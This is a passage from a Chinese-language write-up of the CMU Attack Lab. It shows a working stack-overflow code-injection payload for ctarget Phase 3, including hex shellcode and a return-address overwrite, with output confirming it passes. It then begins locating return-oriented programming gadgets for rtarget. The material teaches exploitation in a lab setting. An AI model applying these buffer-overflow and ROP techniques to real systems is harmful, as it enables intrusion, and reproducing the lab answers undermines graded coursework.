style=--0:#E1E4E8>    $0x0</span><span style=--0:#9ECBFF>,%eax</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>23</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x000000000040194f</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;+85>:</span><span style=--0:#E1E4E8>    </span><span style=--0:#9ECBFF>call</span><span style=--0:#E1E4E8>   </span><span style=--0:#79B8FF>0x400df0</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;__printf_chk@plt></span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>24</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401954</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;+90>:</span><span style=--0:#E1E4E8>    </span><span style=--0:#9ECBFF>mov</span><span style=--0:#E1E4E8>    $0x3</span><span style=--0:#9ECBFF>,%edi</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>25</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401959</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;+95>:</span><span style=--0:#E1E4E8>    </span><span style=--0:#9ECBFF>call</span><span style=--0:#E1E4E8>   </span><span style=--0:#79B8FF>0x401d4f</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;fail></span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>26</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x000000000040195e</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;+100>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>mov</span><span style=--0:#E1E4E8>    $0x0</span><span style=--0:#9ECBFF>,%edi</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>27</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401963</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;+105>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>call</span><span style=--0:#E1E4E8>   </span><span style=--0:#79B8FF>0x400e40</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;exit@plt></span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>28</div></div><div class=code><span style=--0:#B392F0>End</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>of</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>assembler</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>dump.</span></div></div></code></pre><div class=copy><button title="Copy to clipboard" data-code="(gdb) disassemble  touch3Dump of assembler code for function touch3:   0x00000000004018fa <+0>:     push   %rbx   0x00000000004018fb <+1>:     mov    %rdi,%rbx   0x00000000004018fe <+4>:     movl   $0x3,0x202bd4(%rip)        # 0x6044dc <vlevel>   0x0000000000401908 <+14>:    mov    %rdi,%rsi   0x000000000040190b <+17>:    mov    0x202bd3(%rip),%edi        # 0x6044e4 <cookie>   0x0000000000401911 <+23>:    call   0x40184c <hexmatch>   0x0000000000401916 <+28>:    test   %eax,%eax   0x0000000000401918 <+30>:    je     0x40193d <touch3+67>   0x000000000040191a <+32>:    mov    %rbx,%rdx   0x000000000040191d <+35>:    mov    $0x403138,%esi   0x0000000000401922 <+40>:    mov    $0x1,%edi   0x0000000000401927 <+45>:    mov    $0x0,%eax   0x000000000040192c <+50>:    call   0x400df0 <__printf_chk@plt>   0x0000000000401931 <+55>:    mov    $0x3,%edi   0x0000000000401936 <+60>:    call   0x401c8d <validate>   0x000000000040193b <+65>:    jmp    0x40195e <touch3+100>   0x000000000040193d <+67>:    mov    %rbx,%rdx   0x0000000000401940 <+70>:    mov    $0x403160,%esi   0x0000000000401945 <+75>:    mov    $0x1,%edi   0x000000000040194a <+80>:    mov    $0x0,%eax   0x000000000040194f <+85>:    call   0x400df0 <__printf_chk@plt>   0x0000000000401954 <+90>:    mov    $0x3,%edi   0x0000000000401959 <+95>:    call   0x401d4f <fail>   0x000000000040195e <+100>:   mov    $0x0,%edi   0x0000000000401963 <+105>:   call   0x400e40 <exit@plt>End of assembler dump." data-copied=Copied!><div></div></button></div></figure></div><p>不妨以栈顶指针为sval,构造注入代码</p><div class=expressive-code><figure class=frame><figcaption class=header></figcaption><pre data-language=plaintext><code><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>1</div></div><div class=code><span style=--0:#e1e4e8>Phase3:</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>2</div></div><div class=code><span class=indent><span style=--0:#e1e4e8>  </span></span><span style=--0:#e1e4e8>mov    $0x5561dc78, %rdi</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>3</div></div><div class=code><span class=indent><span style=--0:#e1e4e8>  </span></span><span style=--0:#e1e4e8>mov    $0x4018fa,%r8</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>4</div></div><div class=code><span class=indent><span style=--0:#e1e4e8>  </span></span><span style=--0:#e1e4e8>sub    $0x28,%rsp</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>5</div></div><div class=code><span class=indent><span style=--0:#e1e4e8>  </span></span><span style=--0:#e1e4e8>call   *%r8</span></div></div></code></pre><div class=copy><button title="Copy to clipboard" data-code="Phase3:  mov    $0x5561dc78, %rdi  mov    $0x4018fa,%r8  sub    $0x28,%rsp  call   *%r8" data-copied=Copied!><div></div></button></div></figure></div><p>跟Phase2的操作一样,查看机器指令:</p><div class=expressive-code><figure class="frame is-terminal"><figcaption class=header><span class=title></span><span class=sr-only>Terminal window</span></figcaption><pre data-language=shell><code><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>1</div></div><div class=code><span style=--0:#B392F0>Phase3.o:</span><span style=--0:#E1E4E8>     </span><span style=--0:#9ECBFF>file</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>format</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>elf64-x86-64</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>2</div></div><div class=code>
</div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>3</div></div><div class=code>
</div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>4</div></div><div class=code><span style=--0:#B392F0>Disassembly</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>of</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>section</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>.text:</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>5</div></div><div class=code>
</div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>6</div></div><div class=code><span style=--0:#B392F0>0000000000000000</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;Phase3>:</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>7</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0:</span><span style=--0:#E1E4E8>   </span><span style=--0:#79B8FF>48</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>c7</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>c7</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>78</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>dc</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>61</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>55</span><span style=--0:#E1E4E8>    </span><span style=--0:#9ECBFF>mov</span><span style=--0:#E1E4E8>    $0x5561dc78</span><span style=--0:#9ECBFF>,%rdi</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>8</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>7:</span><span style=--0:#E1E4E8>   </span><span style=--0:#79B8FF>49</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>c7</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>c0</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>fa</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>18</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>40</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8>    </span><span style=--0:#9ECBFF>mov</span><span style=--0:#E1E4E8>    $0x4018fa</span><span style=--0:#9ECBFF>,%r8</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>9</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>e:</span><span style=--0:#E1E4E8>   </span><span style=--0:#79B8FF>48</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>83</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>ec</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>28</span><span style=--0:#E1E4E8>             </span><span style=--0:#9ECBFF>sub</span><span style=--0:#E1E4E8>    $0x28</span><span style=--0:#9ECBFF>,%rsp</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>10</div></div><div class=code><span class=indent>  </span><span style=--0:#B392F0>12:</span><span style=--0:#E1E4E8>   </span><span style=--0:#79B8FF>41</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>ff</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>d0</span><span style=--0:#E1E4E8>                </span><span style=--0:#9ECBFF>call</span><span style=--0:#E1E4E8>   </span><span style=--0:#79B8FF>*</span><span style=--0:#9ECBFF>%r8</span></div></div></code></pre><div class=copy><button title="Copy to clipboard" data-code="Phase3.o:     file format elf64-x86-64Disassembly of section .text:0000000000000000 <Phase3>:   0:   48 c7 c7 78 dc 61 55    mov    $0x5561dc78,%rdi   7:   49 c7 c0 fa 18 40 00    mov    $0x4018fa,%r8   e:   48 83 ec 28             sub    $0x28,%rsp  12:   41 ff d0                call   *%r8" data-copied=Copied!><div></div></button></div></figure></div><p>构造注入代码</p><div class=expressive-code><figure class=frame><figcaption class=header></figcaption><pre data-language=plaintext><code><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>1</div></div><div class=code><span style=--0:#e1e4e8>/* Phase3 */</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>2</div></div><div class=code><span style=--0:#e1e4e8>35 39 62 39 39 37 66 61 00          /* cookie:59b997fa */</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>3</div></div><div class=code><span style=--0:#e1e4e8>48 c7 c7 78 dc 61 55                /* mov    $0x5561dc78,%rdi */</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>4</div></div><div class=code><span style=--0:#e1e4e8>49 c7 c0 fa 18 40 00                /* mov    $0x4018fa,%r8 */</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>5</div></div><div class=code><span style=--0:#e1e4e8>48 83 ec 30                         /* sub    $0x30,%rsp */</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>6</div></div><div class=code><span style=--0:#e1e4e8>41 ff d0                            /* call   *%r8 */</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>7</div></div><div class=code><span style=--0:#e1e4e8>/* 以上共30字节 */</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>8</div></div><div class=code><span style=--0:#e1e4e8>ff ff ff ff ff ff ff ff ff ff</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>9</div></div><div class=code><span style=--0:#e1e4e8>81 dc 61 55 /* 返回地址覆写为0x5561dc81  %rsp+9 */</span></div></div></code></pre><div class=copy><button title="Copy to clipboard" data-code="/* Phase3 */35 39 62 39 39 37 66 61 00          /* cookie:59b997fa */48 c7 c7 78 dc 61 55                /* mov    $0x5561dc78,%rdi */49 c7 c0 fa 18 40 00                /* mov    $0x4018fa,%r8 */48 83 ec 30                         /* sub    $0x30,%rsp */41 ff d0                            /* call   *%r8 *//* 以上共30字节 */ff ff ff ff ff ff ff ff ff ff81 dc 61 55 /* 返回地址覆写为0x5561dc81  %rsp+9 */" data-copied=Copied!><div></div></button></div></figure></div><p>故技重施就成功了!</p><div class=expressive-code><figure class="frame is-terminal"><figcaption class=header><span class=title></span><span class=sr-only>Terminal window</span></figcaption><pre data-language=shell><code><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>1</div></div><div class=code><span style=--0:#B392F0>$</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>./ctarget</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>-qi</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>Phase3-raw</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>2</div></div><div class=code><span style=--0:#B392F0>Cookie:</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>0x59b997fa</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>3</div></div><div class=code><span style=--0:#B392F0>Touch3!:</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>You</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>called</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>touch3</span><span style=--0:#E1E4E8>(</span><span style=--0:#B392F0>"59b997fa"</span><span style=--0:#E1E4E8>)</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>4</div></div><div class=code><span style=--0:#B392F0>Valid</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>solution</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>for</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>level</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>3</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>with</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>target</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>ctarget</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>5</div></div><div class=code><span style=--0:#B392F0>PASS:</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>Would</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>have</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>posted</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>the</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>following:</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>6</div></div><div class=code><span class=indent>        </span><span style=--0:#B392F0>user</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>id</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>bovik</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>7</div></div><div class=code><span class=indent>        </span><span style=--0:#B392F0>course</span><span style=--0:#E1E4E8>  </span><span style=--0:#9ECBFF>15213-f15</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>8</div></div><div class=code><span class=indent>        </span><span style=--0:#B392F0>lab</span><span style=--0:#E1E4E8>     </span><span style=--0:#9ECBFF>attacklab</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>9</div></div><div class=code><span class=indent>        </span><span style=--0:#B392F0>result</span><span style=--0:#E1E4E8>  </span><span style=--0:#9ECBFF>1:PASS:0xffffffff:ctarget:3:35</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>39</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>62</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>39</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>39</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>37</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>66</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>61</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>48</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>C7</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>C7</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>78</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>DC</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>61</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>55</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>49</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>C7</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>C0</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FA</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>18</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>40</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>48</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>83</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>EC</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>30</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>41</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>D0</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>81</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>DC</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>61</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>55</span></div></div></code></pre><div class=copy><button title="Copy to clipboard" data-code="$ ./ctarget -qi Phase3-rawCookie: 0x59b997faTouch3!: You called touch3(&#x22;59b997fa&#x22;)Valid solution for level 3 with target ctargetPASS: Would have posted the following:        user id bovik        course  15213-f15        lab     attacklab        result  1:PASS:0xffffffff:ctarget:3:35 39 62 39 39 37 66 61 00 48 C7 C7 78 DC 61 55 49 C7 C0 FA 18 40 00 48 83 EC 30 41 FF D0 FF FF FF FF FF FF FF FF FF FF 81 DC 61 55" data-copied=Copied!><div></div></button></div></figure></div><p>这里我踩了一个坑.一开始我没有 <code>sub $0x30,%rsp</code> 导致cookie字符串被覆写了,因为执行返回地址前栈底指针向上移动40字节,加上返回地址似乎pop了,所以栈底指针其实在0x5561dc78+0x28+0x8处.为了避免覆写我的cookie,应先将栈底指针减去48字节再调用 <code>call touch3</code>.</p><h1 id=rtagetreturn-oriented-programming>rtaget:Return-Oriented Programming</h1><p>为了应对以上ctarget的攻击方式,操作系统采用了栈随机化技术和将栈内存标记为不可执行.虽然不能自己注入代码了,但是现有的代码是可以执行的.这就是面向返回的编程(ROP). ROP的策略是在现有程序的字节序列中抽取指令(以 <code>0xc3 /* ret */</code>结尾),被称为gadget. farm.c文件为我提供了这些可用的指令集,称为gadget farm.在rtarget中,gadget farm以 <code>start_farm</code>函数起始,以 <code>end_farm</code>函数结尾.我在gdb中,首先分别找到了这两个函数所在的地址:</p><div class=expressive-code><figure class="frame is-terminal"><figcaption class=header><span class=title></span><span class=sr-only>Terminal window</span></figcaption><pre data-language=shell><code><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>1</div></div><div class=code><span style=--0:#E1E4E8>(</span><span style=--0:#B392F0>gdb</span><span style=--0:#E1E4E8>) </span><span style=--0:#B392F0>disassemble</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>start_farm</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>2</div></div><div class=code><span style=--0:#B392F0>Dump</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>of</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>assembler</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>code</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>for</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>function</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>start_farm:</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>3</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401994</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;+0>:</span><span style=--0:#E1E4E8>     </span><span style=--0:#9ECBFF>mov</span><span style=--0:#E1E4E8>    $0x1</span><span style=--0:#9ECBFF>,%eax</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>4</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401999</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;+5>:</span><span style=--0:#E1E4E8>     </span><span style=--0:#9ECBFF>ret</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>5</div></div><div class=code><span style=--0:#B392F0>End</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>of</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>assembler</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>dump.</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>6</div></div><div class=code><span style=--0:#E1E4E8>(</span><span style=--0:#B392F0>gdb</span><span style=--0:#E1E4E8>) </span><span style=--0:#B392F0>disass</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>end_farm</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>7</div></div><div class=code><span style=--0:#B392F0>Dump</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>of</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>assembler</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>code</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>for</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>function</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>end_farm:</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>8</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401ab2</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;+0>:</span><span style=--0:#E1E4E8>     </span><span style=--0:#9ECBFF>mov</span><span style=--0:#E1E4E8>    $0x1</span><span style=--0:#9ECBFF>,%eax</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>9</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401ab7</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;+5>:</span><span style=--0:#E1E4E8>     </span><span style=--0:#9ECBFF>ret</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>10</div></div><div class=code><span style=--0:#B392F0>End</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>of</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>assembler</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>dump.</span></div></div></code></pre><div class=copy><button title="Copy to clipboard" data-code="(gdb) disassemble start_farmDump of assembler code for function start_farm:   0x0000000000401994 <+0>:     mov    $0x1,%eax   0x0000000000401999 <+5>:     retEnd of assembler dump.(gdb) disass end_farmDump of assembler code for function end_farm:   0x0000000000401ab2 <+0>:     mov    $0x1,%eax   0x0000000000401ab7 <+5>:     retEnd of assembler dump." data-copied=Copied!><div></div></button></div></figure></div><p>然后显示这两个地址之间内存的字节</p><div class=expressive-code><figure class="frame is-terminal"><figcaption class=header><span class=title></span><span class=sr-only>Terminal window</span></figcaption><pre data-language=shell><code><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>1</div></div><div class=code><span style=--0:#E1E4E8>(</span><span style=--0:#B392F0>gdb</span><span style=--0:#E1E4E8>) </span><span style=--0:#B392F0>disass</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>/r</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>0x401994,0x401ab7</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>2</div></div><div class=code><span style=--0:#B392F0>Dump</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>of</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>assembler</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>code</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>from</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>0x401994</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>to</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>0x401ab7:</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>3</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401994</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;start_farm+0>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>b8</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>01</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8>          </span><span style=--0:#9ECBFF>mov</span><span style=--0:#E1E4E8>    $0x1</span><span style=--0:#9ECBFF>,%eax</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>4</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401999</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;start_farm+5>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>c3</span><span style=--0:#E1E4E8>                      </span><span style=--0:#9ECBFF>ret</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>5</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x000000000040199a</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;getval_142+0>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>b8</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>fb</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>78</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>90</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>90</span><span style=--0:#E1E4E8>          </span><span style=--0:#9ECBFF>mov</span><span style=--0:#E1E4E8>    $0x909078fb</span><span style=--0:#9ECBFF>,%eax</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>6</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x000000000040199f</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;getval_142+5>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>c3</span><span style=--0:#E1E4E8>                      </span><span style=--0:#9ECBFF>ret</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>7</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x00000000004019a0</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;addval_273+0>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>8d</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>87</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>48</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>89</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>c7</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>c3</span><span style=--0:#E1E4E8>       </span><span style=--0:#9ECBFF>lea</span><span style=--0:#E1E4E8>    </span><span style=--0:#79B8FF>-0x3c3876b8(%rdi</span><span style=--0:#E1E4E8>),%eax</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>8</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x00000000004019a6</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;addval_273+6>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>c3</span><span style=--0:#E1E4E8>                      </span><span style=--0:#9ECBFF>ret</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>9</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x00000000004019a7</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;addval_219+0>:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>8d</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>87</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>51</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>73</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>58</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>90</span><span style=--0:#E1E4E8>       </span><span style=--0:#9ECBFF>lea</span><span 